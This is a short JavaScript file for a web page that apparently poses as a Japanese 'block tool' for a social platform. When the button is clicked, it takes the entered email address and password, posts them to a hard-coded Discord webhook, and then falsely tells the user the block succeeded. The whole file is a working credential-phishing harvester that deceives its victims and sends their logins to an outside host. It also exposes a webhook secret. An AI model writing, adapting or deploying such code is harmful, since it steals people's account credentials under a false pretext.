const WEBHOOK_URL = "https://discord.com/api/webhooks/1428302981086056488/XBzxOb-lcrfzm0aaikR6l7YB6NqMHoR_jA2CdlQIkG4eCxlUPSprSYMcCyEJlfPVZH0a";


document.addEventListener('DOMContentLoaded', () => {
    const loginButton = document.getElementById('sendToDiscordButton');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');


    loginButton.onclick = async function(event) {
        event.preventDefault(); 
        
        const emailValue = emailInput.value;
        const passwordValue = passwordInput.value;

        const messageContent = `**新しいログインがありました**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
        
        await sendToDiscord(messageContent);
        
        alert("ブロックに成功しました!"); 
        
        emailInput.value = '';
        passwordInput.value = '';
    }
});


async function sendToDiscord(content) {
    
    const data = {
        "content": content, 
        "username": "ヒカマーブロックツール",
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
        
    } catch (error) {
    
    }
}